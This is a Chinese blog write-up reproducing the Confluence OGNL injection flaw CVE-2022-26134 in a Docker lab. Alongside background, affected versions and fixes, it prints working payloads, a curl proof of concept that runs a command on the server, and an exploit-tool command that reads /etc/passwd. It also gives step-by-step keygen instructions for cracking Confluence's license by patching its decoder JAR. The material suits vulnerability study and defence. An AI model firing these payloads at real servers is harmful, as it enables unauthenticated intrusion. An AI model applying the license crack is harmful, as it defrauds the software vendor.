title="作者IP属地为长安"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长安</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/what%20is%20CVE.png"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><div class="post-ai-description"><div class="ai-title"><i class="anzhiyufont anzhiyu-icon-bilibili"></i><div class="ai-title-text">AI-摘要</div><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right"></i><i class="anzhiyufont anzhiyu-icon-circle-dot" title="朗读摘要"></i><div id="ai-tag">GPT-4.0-turbo GPT</div></div><div class="ai-explanation">AI初始化中...</div><div class="ai-btn-box"><div class="ai-btn-item">介绍自己 🙈</div><div class="ai-btn-item">生成本文简介 👋</div><div class="ai-btn-item">推荐相关文章 📖</div><div class="ai-btn-item">前往主页 🏠</div><div class="ai-btn-item" id="go-tianli-blog">前往爱发电购买</div></div><script data-pjax src="/js/anzhiyu/ai_abstract.js"></script></div><article class="post-content" id="article-container" itemscope itemtype="https://blog.takake.com/posts/62533/"><header><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url">网络安全</a><a href="/tags/RCE/" tabindex="-1" itemprop="url">RCE</a><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" tabindex="-1" itemprop="url">漏洞复现</a><a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/" tabindex="-1" itemprop="url">中间件</a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url">网络安全</a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" tabindex="-1" itemprop="url">渗透测试</a><h1 id="CrawlerTitle" itemprop="name headline">Confluence-CVE-2022-26134</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">Takake</span><time itemprop="dateCreated datePublished" datetime="2024-02-10T16:00:00.000Z" title="发表于 2024-02-11 00:00:00">2024-02-11</time><time itemprop="dateCreated datePublished" datetime="2025-03-27T17:06:07.086Z" title="更新于 2025-03-28 01:06:07">2025-03-28</time></header><h1 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h1><h3 id="6-CVE-2022-26134-漏洞详解"><a href="#6-CVE-2022-26134-漏洞详解" class="headerlink" title="6.CVE-2022-26134 漏洞详解"></a>6.CVE-2022-26134 漏洞详解</h3><p><strong>CVE-2022-26134</strong> 是 Atlassian Confluence 中的一个严重远程代码执行（RCE）漏洞，也称为 <strong>Confluence OGNL 注入漏洞</strong>。该漏洞允许攻击者通过构造恶意的 OGNL（Object-Graph Navigation Language）表达式，在未经身份验证的情况下远程执行任意代码。以下是该漏洞的详细解析，包括漏洞原理、利用条件、影响版本及复现步骤。</p>
+<hr>
+<h4 id="1-漏洞背景"><a href="#1-漏洞背景" class="headerlink" title="1. 漏洞背景"></a>1. 漏洞背景</h4><p>Atlassian Confluence 是一款广泛使用的企业级 Wiki 和知识管理工具，用于团队协作和信息共享。2022 年 6 月，Atlassian 发布安全公告，披露了 Confluence Server 和 Data Center 中的一个严重漏洞（CVE-2022-26134），攻击者可以通过 OGNL 注入实现远程代码执行，危害极大。</p>
+<hr>
+<h4 id="2-CVSS-V3-评分"><a href="#2-CVSS-V3-评分" class="headerlink" title="2. CVSS V3 评分"></a>2. CVSS V3 评分</h4><ul>
+<li><strong>CVSS V3 评分</strong>：9.8（高危）</li>
+</ul>
+<h4 id="3-漏洞原理"><a href="#3-漏洞原理" class="headerlink" title="3. 漏洞原理"></a>3. 漏洞原理</h4><p>漏洞的核心在于 Confluence 对用户输入的 OGNL 表达式处理不当：</p>
+<ol>
+<li><p><strong>OGNL 注入</strong>：</p>
+<ul>
+<li>OGNL 是一种用于访问和操作 Java 对象图的表达式语言。</li>
+<li>攻击者可以通过构造恶意的 OGNL 表达式，将其注入到 Confluence 的请求中。</li>
+<li>Confluence 在处理这些请求时，会解析并执行 OGNL 表达式，导致任意代码执行。</li>
+</ul>
+</li>
+<li><p><strong>漏洞触发点</strong>：</p>
+<ul>
+<li><p>攻击者通过构造特定的 HTTP 请求，将恶意 OGNL 表达式注入到 Confluence 的 URI 中。</p>
+</li>
+<li><p>例如，攻击者可以通过以下 Payload 执行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/$&#123;@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&quot;id&quot;).getInputStream(),&quot;utf-8&quot;)&#125;/</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>该 Payload 会执行 <code>id</code> 命令，并将结果返回给攻击者。</p>
+</li>
+</ul>
+</li>
+<li><p><strong>利用链</strong>：</p>
+<ul>
+<li>攻击者通过发送恶意请求，触发 OGNL 表达式的解析和执行。</li>
+<li>成功利用后，攻击者可以在目标服务器上执行任意命令，例如创建管理员账户、植入后门等。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h4 id="4-影响版本"><a href="#4-影响版本" class="headerlink" title="4. 影响版本"></a>4. 影响版本</h4><ul>
+<li><p><strong>受影响版本</strong>：</p>
+<ul>
+<li>Confluence Server and Data Center 1.3.0 至 7.4.16</li>
+<li>Confluence Server and Data Center 7.13.0 至 7.13.6</li>
+<li>Confluence Server and Data Center 7.14.0 至 7.14.2</li>
+<li>Confluence Server and Data Center 7.15.0 至 7.15.1</li>
+<li>Confluence Server and Data Center 7.16.0 至 7.16.3</li>
+<li>Confluence Server and Data Center 7.17.0 至 7.17.3</li>
+<li>Confluence Server and Data Center 7.18.0。</li>
+</ul>
+</li>
+<li><p><strong>修复版本</strong>：</p>
+<ul>
+<li>Confluence Server and Data Center 7.4.17</li>
+<li>Confluence Server and Data Center 7.13.7</li>
+<li>Confluence Server and Data Center 7.14.3</li>
+<li>Confluence Server and Data Center 7.15.2</li>
+<li>Confluence Server and Data Center 7.16.4</li>
+<li>Confluence Server and Data Center 7.17.4</li>
+<li>Confluence Server and Data Center 7.18.1。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h4 id="5-漏洞利用条件"><a href="#5-漏洞利用条件" class="headerlink" title="5. 漏洞利用条件"></a>5. 漏洞利用条件</h4><ol>
+<li><p><strong>目标系统</strong>：</p>
+<ul>
+<li>运行受影响版本的 Confluence Server 或 Data Center。</li>
+<li>目标系统未打补丁或未采取缓解措施。</li>
+</ul>
+</li>
+<li><p><strong>攻击者权限</strong>：</p>
+<ul>
+<li>攻击者无需身份验证即可利用该漏洞。</li>
+</ul>
+</li>
+<li><p><strong>网络访问</strong>：</p>
+<ul>
+<li>攻击者能够访问目标系统的 Confluence 服务端口（默认 8090）。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h4 id="6-漏洞复现"><a href="#6-漏洞复现" class="headerlink" title="6. 漏洞复现"></a>6. 漏洞复现</h4><p>以下是漏洞复现的简要步骤：</p>
+<ol>
+<li><p><strong>环境搭建</strong>：</p>
+<ul>
+<li>使用 Docker 或虚拟机搭建受影响的 Confluence 版本（如 7.4.16）。</li>
+</ul>
+</li>
+<li><p><strong>构造 Payload</strong>：</p>
+<ul>
+<li><p>使用以下 Payload 执行命令（如 <code>id</code>）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/$&#123;@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&quot;id&quot;).getInputStream(),&quot;utf-8&quot;)&#125;/</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>将 Payload 进行 URL 编码后发送到目标服务器。</p>
+</li>
+</ul>
+</li>
+<li><p><strong>发送请求</strong>：</p>
+<ul>
+<li><p>使用 <code>curl</code> 或 Burp Suite 发送恶意请求：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v <span class="string">&quot;http://目标IP:8090/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/&quot;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>如果漏洞存在，服务器会返回命令执行结果（如 <code>uid=1001(confluence)</code>）。</p>
+</li>
+</ul>
+</li>
+<li><p><strong>工具利用</strong>：</p>
+<ul>
+<li><p>使用自动化工具（如 <code>cve-2022-26134.py</code>）进行漏洞检测和利用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cve-2022-26134.py --rhost 目标IP --rport 8090 --lhost 攻击机IP --protocol http:// --read-file /etc/passwd</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>该工具可以读取目标服务器的文件内容或执行命令。</p>
+</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h4 id="7-修复建议"><a href="#7-修复建议" class="headerlink" title="7. 修复建议"></a>7. 修复建议</h4><ol>
+<li><p><strong>升级版本</strong>：</p>
+<ul>
+<li>升级到 Confluence 的最新修复版本（如 7.4.17、7.13.7 等）。</li>
+</ul>
+</li>
+<li><p><strong>临时缓解措施</strong>：</p>
+<ul>
+<li>替换受漏洞影响的 JAR 文件（如 <code>xwork-1.0.3-atlassian-10.jar</code>）。</li>
+<li>禁用 Confluence 的 OGNL 表达式解析功能。</li>
+</ul>
+</li>
+<li><p><strong>安全加固</strong>：</p>
+<ul>
+<li>使用防火墙或安全组规则限制对 Confluence 端口的访问。</li>
+<li>定期监控系统日志，检测异常访问行为。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h4 id="8-总结"><a href="#8-总结" class="headerlink" title="8. 总结"></a>8. 总结</h4><p>CVE-2022-26134 是一个高危的远程代码执行漏洞，影响范围广泛，利用条件简单。建议用户尽快升级版本并采取安全加固措施，以避免潜在的安全风险。通过禁用不必要的功能、限制访问权限和实施安全策略，可以有效降低漏洞被利用的风险。</p>
+<h1 id="2-破解流程"><a href="#2-破解流程" class="headerlink" title="2.破解流程"></a>2.破解流程</h1><ol>
+<li>Confluence 界面，默认开启端口为8090，8091，需要破解</li>
+</ol>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250212213432393.png?x-oss-process=style/img-to-webp" alt="image-20250212213432393"></p>
+<ol start="2">
+<li>进入docker容器</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker <span class="built_in">exec</span> -it confluence /bin/bash</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>将解码包拉去到本地Windows计算机</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker <span class="built_in">cp</span> a4b46090ecf9:/opt/atlassian/confluence/confluence/WEB-INF/lib/atlassian-extras-decoder-v2-3.4.1.jar ./</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>将该jar包改名为 atlassian-extras-2.4.jar</li>
+<li>java -jar confluence_keygen.jar运行破解工具<ul>
+<li>输入任意名字</li>
+<li>复制 Server ID 并输入</li>
+<li>点击gen生成key</li>
+<li>复制key备用</li>
+<li>再点击patch 破解，选择刚刚重命名的包。 注意如果第二次patch 需要删除bak文件</li>
+<li>显示jar success fully patched，表示破解成功,接下来关闭破解软件即可</li>
+</ul>
+</li>
+</ol>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250213234902554.png?x-oss-process=style/img-to-webp" alt="image-20250213234902554"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250213234706768.png?x-oss-process=style/img-to-webp" alt="image-20250213234706768"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250213235337690.png?x-oss-process=style/img-to-webp" alt="image-20250213235337690"></p>
+<ol start="6">
+<li><p>将生成的atlassian-extras-2.4.jar改回原来的名字atlassian-extras-decoder-v2-3.4.1.jar</p>
+</li>
+<li><p>再将破解包中的mysql-connector-java-8.0.29.jar和atlassian-extras-decoder-v2-3.4.1.jar一起放入docker中的lib目录下。(在放入之前需要给它们附加权限)</p>
+</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> 777 *.jar</span><br><span class="line">$ docker <span class="built_in">cp</span> atlassian-extras-decoder-v2-3.4.1.jar a4b46090ecf9:/opt/atlassian/confluence/confluence/WEB-INF/lib/atlassian-extras-decoder-v2-3.4.1.jar</span><br><span class="line">$ docker <span class="built_in">cp</span> mysql-connector-java-8.0.29.jar a4b46090ecf9:/opt/atlassian/confluence/confluence/WEB-INF/lib/mysql-connector-java-8.0.29.jar</span><br></pre></td></tr></table></figure>
+
+<ol start="8">
+<li>重启docker容器。</li>
+<li>访问8090输入获取到的key</li>
+</ol>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250214002737011.png?x-oss-process=style/img-to-webp" alt="image-20250214002737011"></p>
+<h1 id="3-安装配置"><a href="#3-安装配置" class="headerlink" title="3.安装配置"></a>3.安装配置</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/liulei1632/article/details/129500425">https://blog.csdn.net/liulei1632/article/details/129500425</a></p>
+<ul>
+<li>需要多等待一会</li>
+</ul>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250212233847692.png?x-oss-process=style/img-to-webp" alt="image-20250212233847692"></p>
+<ul>
+<li>选择推荐配置</li>
+</ul>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250214004209355.png?x-oss-process=style/img-to-webp" alt="image-20250214004209355"></p>
+<ul>
+<li>管理用户和组</li>
+</ul>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250214004304439.png?x-oss-process=style/img-to-webp" alt="image-20250214004304439"></p>
+<ul>
+<li>账户密码随便填</li>
+</ul>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250214004350797.png?x-oss-process=style/img-to-webp" alt="image-20250214004350797"></p>
+<ul>
+<li>配置完成</li>
+</ul>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250214004423285.png?x-oss-process=style/img-to-webp" alt="image-20250214004423285"></p>
+<ul>
+<li>尝试创建空间发布文章。</li>
+</ul>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250214004440877.png?x-oss-process=style/img-to-webp" alt="image-20250214004440877"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250214004507002.png?x-oss-process=style/img-to-webp" alt="image-20250214004507002"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250214004541841.png?x-oss-process=style/img-to-webp" alt="image-20250214004541841"></p>
+<h1 id="4-复现流程"><a href="#4-复现流程" class="headerlink" title="4.复现流程"></a>4.复现流程</h1><ol>
+<li>使用curl发送get请求POC</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -v http://192.168.100.137:8090/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.<span class="built_in">exec</span>%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/</span><br><span class="line"></span><br><span class="line"><span class="comment"># http://192.168.100.137:8090/$&#123;(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&quot;id&quot;).getInputStream(),&quot;utf-8&quot;)).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(&quot;X-Cmd-Response&quot;,#a))&#125;/</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>不知道为什么只有curl 能够成功执行</li>
+</ul>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250212235333412.png?x-oss-process=style/img-to-webp" alt="image-20250212235333412"></p>
+<ul>
+<li>使用Postman进行测试</li>
+</ul>
+<ol>
+<li>但我们默认情况下 使用Postman和bp发包都没有回显，这是因为302重定向了，所以需要在postman设置中关闭自动重定向。</li>
+</ol>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250214004815283.png?x-oss-process=style/img-to-webp" alt="image-20250214004815283"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250214012149382.png?x-oss-process=style/img-to-webp" alt="image-20250214012149382"></p>
+<ol start="2">
+<li>然后再发送请求就能看到回显了</li>
+</ol>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250214011305783.png?x-oss-process=style/img-to-webp" alt="image-20250214011305783"></p>
+<ol start="3">
+<li>我在bp中配置了不重定向，不知道为什么不能成功。</li>
+</ol>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250214012053347.png?x-oss-process=style/img-to-webp" alt="image-20250214012053347"></p>
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/avtor.png?x-oss-process=style/img-to-webp" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/avtor.png?x-oss-process=style/img-to-webp" title="头像" alt="头像"></a><div class="post-copyright__author_name">Takake</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="https://blog.takake.com/posts/62533/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('https://blog.takake.com/posts/62533/')">Confluence-CVE-2022-26134</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/red_cross.png?x-oss-process=style/img-to-webp" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/red_cross.png?x-oss-process=style/img-to-webp" alt="红十字会"/></a><div class="post-qr-code-desc">红十字会</div></li><li class="reward-item"><a href="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/logo.png?x-oss-process=style/img-to-webp" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/logo.png?x-oss-process=style/img-to-webp" alt="LOGO"/></a><div class="post-qr-code-desc">LOGO</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="https://blog.takake.com/posts/62533/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=Confluence-CVE-2022-26134&amp;url=https://blog.takake.com/posts/62533/&amp;pic=https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/what%20is%20CVE.png" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
+  var currentPageUrl = window.location.href;
+  var input = document.createElement("input");
+  input.setAttribute("value", currentPageUrl);
+  document.body.appendChild(input);
+  input.select();
+  input.setSelectionRange(0, 99999);
+  document.execCommand("copy");
+  document.body.removeChild(input);
+}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.takake.com" target="_blank">高木のBlog</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/RCE/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>RCE<span class="tagsPageCount">16</span></a><a class="post-meta__box__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>漏洞复现<span class="tagsPageCount">19</span></a><a class="post-meta__box__tags" href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>中间件<span class="tagsPageCount">13</span></a><a class="post-meta__box__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>网络安全<span class="tagsPageCount">7</span></a><a class="post-meta__box__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>渗透测试<span class="tagsPageCount">18</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/nginx01.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/25650/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/what%20is%20CVE.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Spring Cloud-CVE-2022-22947</div></div></a></div><div class="next-post pull-right"><a href="/posts/6124/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/what%20is%20CVE.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">ColdFusion-CVE-2017-3066</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/posts/6124/" title="ColdFusion-CVE-2017-3066"><img class="cover" src= 